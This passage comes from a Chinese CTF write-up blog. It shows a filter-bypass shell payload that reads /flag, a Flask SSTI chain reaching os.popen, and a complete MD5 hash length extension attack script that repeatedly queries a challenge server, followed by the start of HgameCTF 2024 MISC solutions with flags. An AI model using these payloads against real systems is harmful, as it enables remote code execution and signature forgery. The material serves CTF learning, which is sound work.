&lt; 没用上</p><p>在 linux 中 &lt; &lt;&gt; 都可以表示空格</p><p><strong>最终 payload：</strong></p><p><code>$&#39;\164\141\143&#39;&lt;&#39;\057\146\154\141\147&#39;  = tac /flag</code> 得到 flag</p><p>后续发现空格不是被过滤而是传上去被解析转义了，可通过这篇文章找到答案</p><p><a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH4iTwQz0Ki%3D74D">利用 shell 脚本变量构造无字母数字命令 - 先知社区</a></p><h3 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a><strong>我是一个复读机</strong></h3><blockquote><p>本地包用 bp 的内嵌浏览器打开来抓包</p></blockquote><p>打开是登录界面，给了用户名和字典直接爆破即可</p><p><img src="https://s2.loli.net/2024/05/05/tv8fQJAOlnZBrqG.png" alt=""></p><p><code>username=admin&amp;password=asdqwe</code></p><p>进去之后是 ssti<br>出题人wp：</p><blockquote><p>进入之后可以看到输入什么可以在前端页面反应，输入中文会变成{}，这里如果尝试写两个中文<br>加77，类似:￥，77，可以得到回显49<br>这里就比较明显是一个flask的ssti，鉴于如果出常规flask的ssti会被工具一把梭，类似fengjin。<br>所以搞一个中文防止被一把过。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">你好()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)</span><br><span class="line">()|attr(request.values.x4)</span><br><span class="line">(221)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4</span><br><span class="line">)(request.values.x7)|attr(request.values.x4)(request.values.x8)</span><br><span class="line">(request.values.x9)&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem_</span><br><span class="line">_&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&#x27;os&#x27;).pop</span><br><span class="line">en(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="give-me-flag"><a href="#give-me-flag" class="headerlink" title="give me flag"></a><strong>give me flag</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">b83a01a61c8e63f7c905cf71aab83117</span><br></pre></td></tr></table></figure><blockquote><p>学习第一的wp</p></blockquote><p>哈希长度拓展攻击<br><a href="https://tool.chinaz.com/tools/unixtime.aspx">Unix 时间戳(Unix timestamp)转换工具 - 站长工具</a><br>将当前时间戳往后 100 秒<br>比如当前时间戳为1714025400 那就加100：1714025500<br>根据平台特性是动态flag 位数是固定的43位<br>然后用 hash_ext_attack.py构造一个payload<br><img src="https://s2.loli.net/2024/05/07/2iSTUeBqAvHuyj5.png" alt=""></p><blockquote><p>注意提交的$value<br>是 %80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%001714025500 去掉后缀的<br>时间戳 `%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00</p></blockquote><p>使用脚本不断请求<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;URI/?md5=xxx&amp;value=xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>官方脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span>, <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line">rotate_amounts = [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">                  <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">                  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">                  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">constants = [<span class="built_in">int</span>(<span class="built_in">abs</span>(math.sin(i + <span class="number">1</span>)) * <span class="number">2</span> ** <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">functions = <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: (b &amp; c) | (~b &amp; d)] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: (d &amp; b) | (~d &amp; c)] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: b ^ c ^ d] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: c ^ (b | ~d)]</span><br><span class="line"></span><br><span class="line">index_functions = <span class="number">16</span> * [<span class="keyword">lambda</span> i: i] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span>] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span>] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">7</span> * i) % <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_init_values</span>(<span class="params">A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>)-&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [A, B, C, D]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_rotate</span>(<span class="params">x, amount</span>):</span><br><span class="line">    x &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; amount) | (x &gt;&gt; (<span class="number">32</span> - amount))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding_message</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必</span></span><br><span class="line"><span class="string">须进行，即使其位长对512求余的结果等于448。</span></span><br><span class="line"><span class="string">    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</span></span><br><span class="line"><span class="string">    填充的方法如下：</span></span><br><span class="line"><span class="string">        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</span></span><br><span class="line"><span class="string">        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二</span></span><br><span class="line"><span class="string">进制表示的填充前信息长度超过64位，则取低64位。</span></span><br><span class="line"><span class="string">    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这</span></span><br><span class="line"><span class="string">样做的原因是为满足后面处理中对信息长度的要求。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    orig_len_in_bits = (<span class="number">8</span> * <span class="built_in">len</span>(msg)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    msg += <span class="built_in">bytes</span>([<span class="number">0x80</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(msg) % <span class="number">64</span> != <span class="number">56</span>:</span><br><span class="line">        msg += <span class="built_in">bytes</span>([<span class="number">0x00</span>])</span><br><span class="line">    msg += orig_len_in_bits.to_bytes(<span class="number">8</span>, byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    message = padding_message(message)</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    <span class="keyword">for</span> chunk_ofst <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + <span class="built_in">int</span>.from_bytes(chunk[<span class="number">4</span> * g:<span class="number">4</span> *g + <span class="number">4</span>], byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(x &lt;&lt; (<span class="number">32</span> * i) <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_to_hex</span>(<span class="params">digest: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    raw = digest.to_bytes(<span class="number">16</span>, byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:032x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(raw, byteorder = <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span>= <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> md5_to_hex(md5(message, A, B, C, D))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_attack</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>,D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    <span class="keyword">for</span> chunk_ofst <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + <span class="built_in">int</span>.from_bytes(chunk[<span class="number">4</span> * g:<span class="number">4</span> *g + <span class="number">4</span>], byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(x &lt;&lt; (<span class="number">32</span> * i) <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_init_values_from_hash_str</span>(<span class="params">real_hash: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        real_hash: 真实的hash结算结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns: 哈希初始化值[A, B, C, D]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    str_list: <span class="type">List</span>[<span class="built_in">str</span>] = [real_hash[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="comment"># 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + s, <span class="number">16</span>).to_bytes(<span class="number">4</span>, byteorder = <span class="string">&#x27;little&#x27;</span>), byteorder = <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> s <span class="keyword">in</span> str_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5_attack_materials</span>(<span class="params">origin_msg: <span class="built_in">bytes</span>, key_len: <span class="built_in">int</span>, real_hash: <span class="built_in">str</span>,append_data: <span class="built_in">bytes</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        origin_msg: 原始的消息字节流</span></span><br><span class="line"><span class="string">        key_len: 原始密钥（盐）的长度</span></span><br><span class="line"><span class="string">        real_hash: 计算出的真实的hash值</span></span><br><span class="line"><span class="string">        append_data: 需要添加的攻击数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns: 发起攻击需要的物料信息</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        &#x27;attack_fake_msg&#x27;: bytes([...]),</span></span><br><span class="line"><span class="string">        &#x27;attack_hash_value&#x27;: str(a1b2c3d4...)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    init_values = get_init_values_from_hash_str(real_hash)</span><br><span class="line">    <span class="comment"># print([&#x27;&#123;:08x&#125;&#x27;.format(x) for x in init_values])</span></span><br><span class="line">    <span class="comment"># 只知道key的长度，不知道key的具体内容时，任意填充key的内容</span></span><br><span class="line">    fake_key: <span class="built_in">bytes</span> = <span class="built_in">bytes</span>([<span class="number">0xff</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(key_len)])</span><br><span class="line">    <span class="comment"># 计算出加了append_data后的真实填充数据</span></span><br><span class="line">    </span><br><span class="line">    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)</span><br><span class="line">    <span class="comment"># 攻击者提前计算添加了攻击数据的哈希</span></span><br><span class="line">    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[<span class="built_in">len</span>(padding_message(fake_key + origin_msg)):],A = init_values[<span class="number">0</span>],B = init_values[<span class="number">1</span>],C = init_values[<span class="number">2</span>],D = init_values[<span class="number">3</span>]))</span><br><span class="line">    fake_padding_data = padding_message(fake_key + origin_msg)[<span class="built_in">len</span>(fake_key +origin_msg):]</span><br><span class="line">    attack_fake_msg = origin_msg + fake_padding_data + append_data</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;attack_fake_msg&#x27;</span>: attack_fake_msg,<span class="string">&#x27;attack_hash_value&#x27;</span>: attack_hash_value&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">data,md5</span>):</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    new_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp = <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tmp) == <span class="number">1</span>:</span><br><span class="line">            tmp = <span class="string">&#x27;0&#x27;</span>+tmp</span><br><span class="line">        new_data += <span class="string">&#x27;%&#x27;</span>+tmp</span><br><span class="line">    url = <span class="string">&#x27;http://gz.imxbt.cn:20379/&#x27;</span></span><br><span class="line">    r = requests.get(url+<span class="string">f&#x27;?value=<span class="subst">&#123;new_data&#125;</span>&amp;md5=<span class="subst">&#123;md5&#125;</span>&#x27;</span>).text</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;yes&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data: <span class="built_in">bytes</span> = <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    md5_value = <span class="string">&#x27;1ebd3886123262af5b633ad5d225c965&#x27;</span></span><br><span class="line">    key_len = <span class="number">42</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="built_in">print</span>(key_len)</span><br><span class="line">        attack_data = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()+<span class="number">3.5</span>)).encode()</span><br><span class="line">        attack_materials = get_md5_attack_materials(data, key_len, md5_value,attack_data)</span><br><span class="line">        <span class="comment"># print(attack_materials[&#x27;attack_fake_msg&#x27;][1:-10])</span></span><br><span class="line">        <span class="comment"># print(attack_data)</span></span><br><span class="line">        req(attack_materials[<span class="string">&#x27;attack_fake_msg&#x27;</span>][<span class="number">1</span>:-<span class="built_in">len</span>(attack_data)],attack_materials[<span class="string">&#x27;attack_hash_value&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(time.time()-start)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HgameCTF 2024</title>
      <link href="/posts/HgameCTF2024.html"/>
      <url>/posts/HgameCTF2024.html</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a><strong>SignIn</strong></h3><p><strong>PS</strong></p><p><strong>ctrl+T 出现调整框</strong><br><strong>按住 shift 然后上下拉窄，左右拉宽</strong></p><p><img src="https://s2.loli.net/2024/03/08/1xilGPz2Mhs8J4c.png" alt=""></p><p><strong>hgame{WOW_GREAT_YOU_SEE_IT_WONDERFUL}</strong></p><h3 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a><strong>simple_attack</strong></h3><p>明文攻击<br>把给的图片用 bandizip 压缩成 zip 文件后作为明文文件<br>在 ARCHPR 中解密</p><p><img src="https://s2.loli.net/2024/03/08/QZMgWYaCx3UXp4c.png" alt=""></p><p>解密后打开 txt 文件</p><p><img src="https://s2.loli.net/2024/03/08/dX6qhgmnKaWHs5I.png" alt=""></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9245474.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9245474.html</a></p><p>得到的字符串直接放在 url 处就可以得到 flag 图片了</p><p><img src="https://s2.loli.net/2024/03/08/igjodORFKz53JSw.png" alt=""></p><p><strong>hgame{s1mple_attack_for_zip}</strong></p><h3 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a><strong>希儿希儿希尔</strong></h3><p><img src="https://s2.loli.net/2024/03/08/2l9vMiuKsT5wYe1.png" alt=""></p><p>不用修复图片</p><p>直接拉到 010 底部看到密文</p><p><img src="https://s2.loli.net/2024/03/08/3ApHNESgnRGZc51.png" alt=""></p><p>结合题目标题可知是希尔解密</p><p>密钥使用 zsteg 查信道得到</p><p><img src="https://s2.loli.net/2024/03/08/6VznFHO7JTKSqZ1.png" alt=""></p><p>密钥是 8 7 3 8</p><p><a href="http://www.metools.info/code/hillcipher243.html">http://www.metools.info/code/hillcipher243.html</a></p><p><img src="https://s2.loli.net/2024/03/08/okm2rdZixFRGq9X.png" alt=""></p><p>得到 flag<br><strong>hgame{DISAPPEARINTHESEAOFBUTTERFLY}</strong></p><h3 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a><strong>来自星尘的问候</strong></h3><p><img 